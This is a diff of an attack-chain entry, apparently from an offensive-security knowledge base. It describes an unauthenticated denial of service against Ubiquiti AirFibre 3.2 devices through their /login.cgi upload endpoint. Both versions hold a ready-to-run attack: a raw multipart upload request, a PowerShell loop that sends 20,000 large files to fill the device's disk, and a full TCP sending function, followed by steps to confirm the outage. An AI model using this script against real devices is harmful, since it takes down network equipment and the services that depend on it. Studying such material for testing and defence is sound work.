@@ -1,55 +1,53 @@
 ---
+id: ac-ubiquiti-dos-001
 tags:
-  - unauthenticated-upload
-  - dos
   - file-upload
+  - dos
+  - unauthenticated
   - disk-exhaustion
   - ubiquiti
+  - airfibre
 type: attack_chain
 tools:
   - '[[tools/PowerShell]]'
 tactics:
-  - '[[Initial Access]]'
+  - '[[Execution]]'
   - '[[Impact]]'
-commands:
-  - '[[commands/Upload-File-via-HTTP-POST-to-login-cgi]]'
-  - '[[commands/PowerShell-Script-for-Mass-File-Upload-DoS]]'
-  - '[[commands/Send-NetworkData-TCP-Function]]'
+verified: false
 platforms:
-  - Web
   - Embedded Linux
+  - Web
+submitted: true
 complexity: medium
+created_at: '2024-10-01T00:00:00Z'
 procedures:
-  - '[[procedures/Test-Unauthenticated-File-Upload-to-login-cgi]]'
-  - '[[procedures/Upload-Multiple-Files-to-Exhaust-Disk-Space]]'
-  - '[[procedures/Verify-Disk-Exhaustion-Condition]]'
+  - '[[procedures/Perform-Unauthenticated-File-Upload]]'
+  - '[[procedures/Repeat-Uploads-for-Disk-Exhaustion]]'
+  - '[[procedures/Verify-Disk-Exhaustion-Impact]]'
 step_count: 3
 techniques:
-  - '[[Exploit Public-Facing Application]]'
+  - '[[Remote File Copy]]'
+  - '[[Endpoint Denial of Service]]'
   - '[[OS Exhaustion Flood]]'
+updated_at: '2025-12-14T17:31:10.960Z'
 description: >-
-  Exploit unauthenticated file upload in Ubiquiti AirFibre 3.2 firmware to
-  upload large files and cause denial-of-service by exhausting disk space.
+  A multi-stage attack exploiting unauthenticated file upload in Ubiquiti
+  AirFibre 3.2 to achieve denial of service via disk space exhaustion,
+  potentially chainable with LFI for further compromise.
 skill_level: intermediate
 impact_level: high
-id: 48e955b6-7d9e-4dd5-b934-1d2f602ae1e1
-created_at: '2025-12-14T05:32:10.014Z'
-updated_at: '2025-12-14T05:32:10.014Z'
-verified: false
 validated: true
-submitted: true
 mitre_tactics:
-  - '[[Initial Access]]'
+  - '[[Execution]]'
   - '[[Impact]]'
 mitre_techniques:
-  - '[[Exploit Public-Facing Application]]'
+  - '[[Remote File Copy]]'
+  - '[[Endpoint Denial of Service]]'
   - '[[OS Exhaustion Flood]]'
 ---
 # Unauthenticated File Upload Leading to Disk Exhaustion DoS on Ubiquiti AirFibre 3.2
 
-## Overview
-
-This attack chain exploits an unauthenticated file upload vulnerability in the Ubiquiti AirFibre 3.2 firmware's /login.cgi endpoint. Attackers can POST multipart/form-data payloads without credentials, storing files in /tmp/upload. By uploading numerous large files with unique names, the device's disk space (shared between /tmp and /var) is exhausted, leading to a denial-of-service (DoS) condition that disrupts services like the radio daemon. While direct remote code execution (RCE) is not achieved, the upload can potentially chain with local file inclusion (LFI) flaws for escalation.
+Multi-stage attack chain demonstrating exploitation of unauthenticated file upload vulnerability in the /login.cgi endpoint of Ubiquiti AirFibre 3.2 firmware, leading to denial of service by exhausting disk space in the /tmp/upload directory, which shares a partition with /var. This can disrupt device services and may be chained with local file inclusion for code execution.
 
 ## Chain Metrics Dashboard
 
@@ -57,7 +55,7 @@ This attack chain exploits an unauthenticated file upload vulnerability in the U
 |--------|-------|
 | Chain Status | Unverified |
 | Total Steps | 3 |
-| Execution Time | ~10-15 minutes |
+| Execution Time | ~10-30 minutes |
 | Skill Level | Intermediate |
 | Complexity | Medium |
 | Impact Level | High |
@@ -66,7 +64,8 @@ This attack chain exploits an unauthenticated file upload vulnerability in the U
 
 ```mermaid
 graph LR
-    A[Initial Access: Test Upload] --> B[Execution: Mass Upload] --> C[Impact: Verify DoS]
+    A[Initial File Upload] --> B[Repeated Uploads for DoS]
+    B --> C[Verify Impact]
 
     style A fill:#e74c3c
     style B fill:#f39c12
@@ -81,108 +80,179 @@ graph LR
 
 ### Target Environment
 
-- Ubiquiti AirFibre 3.2 firmware on embedded Linux
-- HTTP service on port 80
-- Network access to the device (no authentication needed)
+- Ubiquiti AirFibre 3.2 device running AirOS on Embedded Linux
+- Web service on port 80
+- Network access to the device (no authentication required)
 
 ### Initial Access Requirements
 
-- Direct network reachability to the target's IP on port 80
-- No credentials required due to unauthenticated endpoint
-- PowerShell environment for scripting
+- Direct network connectivity to the target IP
+- No credentials needed due to unauthenticated endpoint
+- Prior access not required
 
 ## Detailed Attack Procedures
 
 ### Step 1: Initial Access
-procedure: [[procedures/Test-Unauthenticated-File-Upload-to-login-cgi]]
+procedure: [[procedures/Perform-Unauthenticated-File-Upload]]
 
-**Objective**: Verify the unauthenticated file upload capability by sending a single test file to /login.cgi and confirming storage in /tmp/upload.
+**Objective**: Demonstrate unauthenticated file upload to /tmp/upload via /login.cgi to confirm vulnerability.
 
-**Instructions**: Use [[commands/Upload-File-via-HTTP-POST-to-login-cgi]] to send a POST request with a small test file:
+**Instructions**: Send a POST request to the /login.cgi endpoint using multipart/form-data without credentials. Use [[commands/unauthenticated-file-upload-post]] to upload a test file:
 
-```powershell
-# Example POST body for single upload
-POST http://$ip/login.cgi HTTP/1.1
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoA1KFlNlMcwhR9SP
+```http
+POST http://[ip]/login.cgi HTTP/1.1
+Proxy-Connection: keep-alive
+Content-Length: 5179
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRfhSBNfoYzLOvXnc
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.8
+Host: [ip]
 
-------WebKitFormBoundaryoA1KFlNlMcwhR9SP
-Content-Disposition: form-data; name="file"; filename="test.txt"
+------WebKitFormBoundaryRfhSBNfoYzLOvXnc
+Content-Disposition: form-data; name="file"; filename="test6.txt"
 Content-Type: text/plain
 
-aaaa
-------WebKitFormBoundaryoA1KFlNlMcwhR9SP
-Content-Disposition: form-data; name="action"
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 
-upload
-------WebKitFormBoundaryoA1KFlNlMcwhR9SP--
+------WebKitFormBoundaryRfhSBNfoYzLOvXnc--
 ```
 
-Send via TCP using [[commands/Send-NetworkData-TCP-Function]] piped with the POST data to port 80.
-
-**Expected Output**: HTTP 200 response; file 'test.txt' stored in /tmp/upload on the device.
+**Expected Output**: HTTP 200 OK response; file stored in /tmp/upload/test6.txt on the device.
 
 **Success Indicators**:
-- No authentication prompt during POST
-- Server accepts and stores the file without errors
+- File appears in /tmp/upload directory
+- No authentication prompt or error
 
 ### Step 2: Execution
-procedure: [[procedures/Upload-Multiple-Files-to-Exhaust-Disk-Space]]
+procedure: [[procedures/Repeat-Uploads-for-Disk-Exhaustion]]
 
-**Objective**: Automate the upload of 20,000 large files (90KB each) with unique names to fill the /tmp and /var partitions, causing DoS.
+**Objective**: Exhaust disk space by uploading thousands of large files with unique names to cause DoS on shared /tmp and /var partitions.
 
-**Instructions**: Execute the [[commands/PowerShell-Script-for-Mass-File-Upload-DoS]] script, which loops and generates unique POST requests:
+**Instructions**: Use PowerShell to loop 20,000 uploads of 90KB files. Execute [[commands/powershell-disk-exhaustion-script]] with target IP set:
 
 ```powershell
-$ip = "10.62.148.4"
+$ip = "[target-ip]"
 $content = "A" * 90000
 
-for ($i=1; $i -le 20000; $i++) {
-    $POST = "POST http://$ip/login.cgi HTTP/1.1`nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryoA1KFlNlMcwhR9SP`n`n------WebKitFormBoundaryoA1KFlNlMcwhR9SP`nContent-Disposition: form-data; name=\"file\"; filename=\""$i.txt\"`nContent-Type: text/plain`n`n$content`n------WebKitFormBoundaryoA1KFlNlMcwhR9SP`nContent-Disposition: form-data; name=\"action\"`n`nupload`n------WebKitFormBoundaryoA1KFlNlMcwhR9SP--"
-    echo $POST | Send-NetworkData -Computer $ip -Port 80
+for ($i=1; $i -le 20000; $i++)
+{
+$POST = "POST http://$ip/login.cgi HTTP/1.1\nProxy-Connection: keep-alive\nContent-Length: 5278\nCache-Control: max-age=0\nOrigin: http://$ip\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryoA1KFlNlMcwhR9SP\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nReferer: http://$ip/login.cgi\nAccept-Language: en-US,en;q=0.8\nCookie: last_check=1485458998012; AIROS_SESSIONID=64e0483fab347136fb49fdf81e5542bc; ui_language=en_US\nHost: $ip\n\n------WebKitFormBoundaryoA1KFlNlMcwhR9SP\nContent-Disposition: form-data; name=\"file\"; filename=\"$i.txt\"\nContent-Type: text/plain\n\n$content\n------WebKitFormBoundaryoA1KFlNlMcwhR9SP\nContent-Disposition: form-data; name=\"action\"\n\nupload\n------WebKitFormBoundaryoA1KFlNlMcwhR9SP--\n"
+echo $POST | Send-NetworkData -Computer [target-ip] -Port 80
+}
+
+function Send-NetworkData {
+[CmdletBinding()]
+param (
+[Parameter(Mandatory)][string]
+$Computer,
+
+[Parameter(Mandatory)][ValidateRange(1, 65535)]
+[Int16]
+$Port,
+
+[Parameter(ValueFromPipeline)]string[]
+$Data,
+
+[System.Text.Encoding]
+$Encoding = [System.Text.Encoding]::ASCII,
+
+[TimeSpan]
+$Timeout = [System.Threading.Timeout]::InfiniteTimeSpan)
+
+begin {
+# establish the connection and a stream writer
+$Client = New-Object -TypeName System.Net.Sockets.TcpClient
+$Client.Connect($Computer, $Port)
+$Stream = $Client.GetStream()
+$Writer = New-Object -Type System.IO.StreamWriter -ArgumentList $Stream, $Encoding, $Client.SendBufferSize, $true
+}
+process {
+# send all the input data
+foreach ($Line in $Data) {
+$Writer.WriteLine($Line)
+}
+}
+end {
+# flush and close the connection send
+$Writer.Flush()
+$Writer.Dispose()
+$Client.Client.Shutdown('Send')
+# read the response
+$Stream.ReadTimeout = [System.Threading.Timeout]::Infinite
+if ($Timeout -ne [System.Threading.Timeout]::InfiniteTimeSpan) {
+$Stream.ReadTimeout = $Timeout.TotalMilliseconds
+}
+
+$Result = ''
+$Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize
+do {
+try {
+$ByteCount = $Stream.Read($Buffer, 0, $Buffer.Length)
+} catch [System.IO.IOException] {
+$ByteCount = 0
+}
+if ($ByteCount -gt 0) {
+$Result += $Encoding.GetString($Buffer, 0, $ByteCount)
+}
+} while ($Stream.DataAvailable -or $Client.Client.Connected)
+
+Write-Output $Result
+# cleanup
+$Stream.Dispose()
+$Client.Dispose()
+}
 }
 ```
 
-This uses [[commands/Send-NetworkData-TCP-Function]] internally for each iteration.
-
-**Expected Output**: 20,000 successful uploads; accumulating ~1.8GB of data, filling partitions.
+**Expected Output**: Series of successful HTTP responses; after ~20,000 uploads, disk full errors or service disruptions.
 
 **Success Indicators**:
-- Script completes without connection errors
-- Device services begin failing due to disk full
+- Uploads succeed initially
+- Device services (e.g., radiod) begin failing due to space exhaustion
 
-### Step 3: Impact
-procedure: [[procedures/Verify-Disk-Exhaustion-Condition]]
+### Step 3: Objective
+procedure: [[procedures/Verify-Disk-Exhaustion-Impact]]
 
-**Objective**: Confirm the DoS by checking disk usage and observing service disruptions.
+**Objective**: Confirm the DoS impact by checking filesystem usage on the device.
 
-**Instructions**: If possible, access the device console or use tools to run `df -h` and inspect /var and /tmp. Monitor for errors in services like radiod.
+**Instructions**: Access the device shell and run [[commands/df-disk-usage]] to inspect partitions:
 
-**Expected Output**: `df` output showing 100% usage on relevant partitions; files like radiod impacted in /tmp.
+```bash
+df
+```
+
+Observe effects like radiod file size changes indicating service disruption.
+
+**Expected Output**: Output showing /dev/root at 100% usage for /tmp and /var.
 
 **Success Indicators**:
-- Disk partitions full (e.g., /var at 100%)
-- Device logs or services show I/O errors
+- Filesystem reports full partition
+- Device logs show service errors
 
 ## Attack Chain Summary
 
 ### Key Achievements
 
-1. Confirmed unauthenticated access to file upload endpoint
-2. Exhausted device storage via mass uploads, achieving DoS
-3. Demonstrated potential for chaining with LFI for higher impact
+1. Confirmed unauthenticated file upload without restrictions
+2. Achieved DoS by exhausting shared disk partition
+3. Demonstrated potential for chaining with LFI
 
 ## Technique & Tactic Coverage
 
 ### MITRE ATT&CK Techniques
 
-- [[Exploit Public-Facing Application]]
-- [[OS Exhaustion Flood]]
+- [[Remote File Copy]] Ingress Tool Transfer
+- [[Endpoint Denial of Service]] Endpoint Denial of Service
+- [[OS Exhaustion Flood]] OS Exhaustion Floods
 
 ### MITRE ATT&CK Tactics
 
-- [[Initial Access]]
-- [[Impact]]
+- [[Execution]] Execution
+- [[Impact]] Impact
 
 ---
 
-*Last updated: 2023-10-01*
+*Last updated: 2024-10-01T00:00:00Z*
